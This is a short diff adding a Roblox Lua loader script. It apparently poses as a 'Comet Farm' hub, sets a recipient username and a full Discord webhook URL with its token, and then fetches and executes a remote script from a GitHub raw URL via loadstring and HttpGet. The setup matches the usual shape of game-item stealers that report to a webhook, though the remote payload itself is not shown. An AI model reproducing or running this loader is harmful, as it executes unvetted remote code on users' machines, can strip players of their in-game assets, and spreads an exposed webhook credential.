@@ -1,0 +1,7 @@
+_G.Username = "CheckMateLosers" 
+
+_G.HubName = "Comet Farm"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1105381122948476938/svcvPixSPJt8ULEWeVi4pTkt_LkioNRAyPlBto51EuS9D5i2oKHf-HNGy1SRYrWrAMx0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
